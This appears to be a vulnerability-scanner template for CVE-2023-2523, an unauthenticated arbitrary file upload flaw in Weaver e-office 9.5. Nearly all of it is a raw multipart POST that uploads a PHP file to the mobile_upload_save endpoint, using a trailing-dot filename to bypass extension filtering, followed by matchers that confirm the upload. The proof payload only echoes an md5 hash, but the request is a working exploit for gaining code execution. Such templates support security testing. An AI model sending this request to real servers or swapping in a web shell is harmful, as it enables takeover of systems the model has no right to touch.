id: CVE-2023-2523

info:
  name: E-office 任意文件上传-mobile_upload_save
  author: Rabb1ter
  severity: critical
  description: 泛微e-office 9.5版本App/Ajax/ajax.php?action=mobile_upload_save 的一些未知功能存在问题。 参数 upload_quwan 的操作导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限
  classification:
    cve-id: CVE-2023-2523

requests:
  - raw:
    - |
        POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt

        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="upload_quwan"; filename="fh812y34hu02tysf23.php."
        Content-Type: image/jpeg

        <?php echo md5('CVE-2023-2523');?>

        -------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="file"; filename=""
        Content-Type: application/octet-stream
    matchers:
      - type: word
        words:
          - "fh812y34hu02tysf23.php"
        part: body

      - type: status
        status:
          - 200